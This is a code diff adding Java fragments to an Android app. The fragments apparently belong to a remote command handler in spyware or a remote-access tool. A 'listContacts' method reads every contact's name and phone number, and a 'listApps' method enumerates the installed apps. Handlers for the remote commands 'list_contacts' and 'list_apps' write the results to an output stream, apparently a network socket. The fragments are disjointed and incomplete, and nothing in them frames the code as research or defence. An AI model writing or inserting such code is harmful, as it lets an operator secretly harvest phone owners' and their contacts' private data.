@@ -1,0 +1,47 @@
+ // Contacts
+    public String listContacts() {
+        StringBuilder sb = new StringBuilder();
+        Cursor c = getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null
+        );
+        while (c != null && c.moveToNext()) {
+            String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            sb.append(name).append(" : ").append(number).append("\n");
+        }
+        if (c != null) c.close();
+        return sb.toString();
+    }
+  
+
+
+else if (line.equalsIgnoreCase("list_contacts")) {
+                        String contacts = MainActivity.instance.listContacts();
+                        out.write((contacts + "\n").getBytes());
+                        out.flush();
+
+
+
+
+
+
+ // List launchable apps
+    public String listApps() {
+        StringBuilder sb = new StringBuilder();
+        PackageManager pm = getPackageManager();
+        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+        for (ApplicationInfo app : apps) {
+            Intent launchIntent = pm.getLaunchIntentForPackage(app.packageName);
+            if (launchIntent != null) { // only launchable apps
+                sb.append(app.packageName).append("\n");
+            }
+        }
+        return sb.toString();
+    }
+
+
+else if (line.equalsIgnoreCase("list_apps")) {
+                        String apps = MainActivity.instance.listApps();
+                        out.write((apps + "\n").getBytes());
+                        out.flush();
